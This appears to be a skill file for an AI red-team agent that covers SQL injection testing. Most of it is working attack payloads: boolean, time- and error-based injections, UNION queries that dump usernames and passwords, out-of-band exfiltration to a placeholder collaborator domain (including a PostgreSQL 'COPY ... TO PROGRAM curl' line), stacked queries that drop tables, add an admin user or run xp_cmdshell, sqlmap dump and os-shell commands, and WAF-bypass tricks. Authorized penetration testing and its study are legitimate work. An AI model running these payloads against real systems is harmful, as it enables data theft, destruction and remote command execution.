---
name: sqli-testing
description: Detect and exploit SQL injection vulnerabilities in web application parameters
origin: RedteamOpencode
---

# SQL Injection Testing

## When to Activate

- Parameter may reach a DB query (search, login, filter, sort, ID lookup)
- Error messages reveal SQL backend, numeric/string params in URLs/POST/cookies/headers

## Detection

### 1. Initial Probing
```
# String: '  ''  ' OR '1'='1  ' OR '1'='2  " OR "1"="1
# Numeric: 1 OR 1=1  1 OR 1=2  1 AND 1=1  1 AND 1=2
# Comment: ' --  ' #  ') OR ('1'='1
```

### 2. Boolean-Based
```
?id=1 AND 1=1    # True — normal content
?id=1 AND 1=2    # False — different content
?id=1' AND '1'='1  /  ?id=1' AND '1'='2
```

### 3. Time-Based
```
' OR SLEEP(5)--                              # MySQL
'; SELECT pg_sleep(5)--                      # PostgreSQL
'; WAITFOR DELAY '0:0:5'--                   # MSSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--   # Oracle (no native SLEEP)
' OR (SELECT COUNT(*) FROM sysprocesses)>0-- # SQLite fallback: heavy recursive CTE below
;WITH RECURSIVE r(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<3000000) SELECT COUNT(*) FROM r-- # SQLite (no SLEEP; CPU-burn timing oracle)
```

### 4. Error-Based
```
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--    # MySQL
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--# MySQL (alt when EXTRACTVALUE filtered)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- # MySQL GROUP BY dup-key error
' AND 1=CAST((SELECT version()) AS int)--                  # PostgreSQL
' AND 1=CONVERT(int,(SELECT @@version))--                  # MSSQL
' AND 1=(SELECT UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE rownum=1)))--  # Oracle
' AND EXTRACTVALUE(xmltype('<?xml version="1.0"?><r>'||(SELECT banner FROM v$version WHERE rownum=1)||'</r>'),'/l')--  # Oracle XML error-based
```

## Database Identification

| DB | Error Pattern |
|----|---------------|
| MySQL | `You have an error in your SQL syntax`, `MariaDB` |
| PostgreSQL | `unterminated quoted string`, `PSQLException` |
| MSSQL | `Unclosed quotation mark`, `Microsoft SQL` |
| SQLite | `SQLITE_ERROR`, `unrecognized token` |
| Oracle | `ORA-`, `quoted string not properly terminated` |

Version: `SELECT version()` (MySQL/PG), `SELECT @@version` (MySQL/MSSQL), `SELECT sqlite_version()` (SQLite)

## Exploitation

### UNION-Based
```
' ORDER BY 1--  ' ORDER BY 2--  ...  # Find column count (increment until error)
' UNION SELECT NULL,NULL,NULL--       # Match column count
' UNION SELECT NULL,'a',NULL--        # Find displayable columns
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

### Lab objective recall closure

When the active profile (`lab-profile.json`) lists schema/credential objectives, generic SQLi proof or admin roster access is not enough. For a schema objective, requeue one exact native injection workflow (login/search or the route that already showed SQLi signal) with a `sqlite_master`/`information_schema` extraction payload, save the response artifact, and immediately run `python3 ./scripts/lab_objective.py snapshot "$DIR"` (or fetch the objective source). For a credential objective, requeue a credential-bearing dump (`Users.password`, signed authentication-details, or an equivalent backup/database artifact) and solved-check that branch separately. Do not close either branch as a generic SQL finding until the handoff records `objective=<name> status=solved|requeued evidence=<artifact> next=<exact action>`. Consult the profile's `recall_branches` for the exact routes and payload hints.

### Blind Boolean
```
' AND SUBSTRING(version(),1,1)='5'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
```

### Blind Time
```
' AND IF(SUBSTRING(version(),1,1)='8',SLEEP(3),0)--                          # MySQL
' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(3) ELSE pg_sleep(0) END--  # PG
```

### Out-of-Band
```
' UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.COLLAB_DOMAIN\\a'))--      # MySQL
'; EXEC master..xp_dirtree '\\COLLAB_DOMAIN\a'--                             # MSSQL
'; EXEC master..xp_fileexist '\\COLLAB_DOMAIN\a'--                           # MSSQL (no xp_cmdshell needed)
'; COPY (SELECT version()) TO PROGRAM 'curl http://COLLAB_DOMAIN/'--          # PG
' AND UTL_HTTP.REQUEST('http://COLLAB_DOMAIN/'||(SELECT banner FROM v$version WHERE rownum=1))--  # Oracle
' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1)||'.COLLAB_DOMAIN')-- # Oracle DNS exfil
```

### Stacked Queries (when the driver allows multi-statement execution)
```
1; DROP TABLE logs--                                                    # Generic destructive test (staging only, confirm authorization scope first)
1; EXEC xp_cmdshell 'whoami'--                                          # MSSQL RCE via stacked query (requires xp_cmdshell enabled / sysadmin)
1; INSERT INTO users(username,password,role) VALUES ('pwn','x','admin')-- # Privilege escalation via stacked INSERT
```
Stacked queries rarely work through PHP `mysqli`/`PDO::query` single-statement APIs but often work through raw drivers, ORMs with `multipleStatements: true`, or MSSQL/PG CLI-backed connectors — confirm the backend framework via `source-analysis` before assuming it's blocked.

### Second-Order SQLi
- [ ] Payload stored via one endpoint (registration, profile update) is not sanitized when *read back* and used in a later query (e.g. username used unsanitized in an internal audit-log lookup)
- [ ] Submit a payload as a value that is clearly stored (profile field, display name) then trigger a downstream feature that is likely to re-query using that value (search-by-username, "recently viewed", admin audit trail) and watch for injection signal there instead of on the submission response
- [ ] Useful when first-order testing on the submission endpoint shows full sanitization but a related read/report endpoint does not re-sanitize on use

## sqlmap
```bash
run_tool sqlmap -u "http://target/page?id=1" --batch --dbs --level 3 --risk 2
run_tool sqlmap -u "http://target/login" --data="user=a&pass=b" --batch --dbs
# Default current-engagement auth should come from auth.json; only pass --cookie or headers explicitly for override tests.
run_tool sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
run_tool sqlmap -u "http://target/page?id=1" --batch -D dbname -T users --dump
run_tool sqlmap -r $DIR/scans/request.txt --batch --dbs --level 3 --risk 2
run_tool sqlmap -u "http://target/page?id=1" --os-shell --batch
```

## WAF Bypass
```
%27%20OR%20%271%27%3D%271                    # URL encoding
%2527%2520OR%25201=1                         # Double URL encoding (WAF decodes once, app decodes twice)
' uNiOn SeLeCt NULL,version(),NULL--         # Case alternation
UN/**/ION SE/**/LECT NULL,version(),NULL--   # Comment insertion
UNI%0bON SEL%0bECT NULL,version(),NULL--     # Vertical-tab / line-feed whitespace substitution
/*!50000UNION*/ /*!50000SELECT*/             # MySQL inline comments (version-gated execution, hides from generic filters)
'%09OR%091=1--                               # Whitespace alternatives (tab/newline/CR/formfeed)
' OR 'x'='x                                  # Quote-balanced true condition (evades regex expecting `1=1`)
' OR 1=1-- -                                 # Trailing dash after comment to satisfy WAFs requiring space after --
'/**/OR/**/1/**/LIKE/**/1--                  # Keyword substitution: LIKE instead of =
' UNION SELECT/**/version(),NULL--           # Column-position juggling to dodge signature order
CoNcAt(0x27,0x4f,0x52,0x27)                  # Hex/char-concat to rebuild filtered keywords at runtime
run_tool sqlmap -u "URL" --tamper=between,randomcase,space2comment --batch --dbs
run_tool sqlmap -u "URL" --tamper=charencode,equaltolike,apostrophemask --batch --dbs   # Additional tamper chain for stricter WAFs
```
Chain into `waf-evasion-testing` for broader WAF/filter fingerprinting and generic evasion technique selection before committing to one tamper chain.
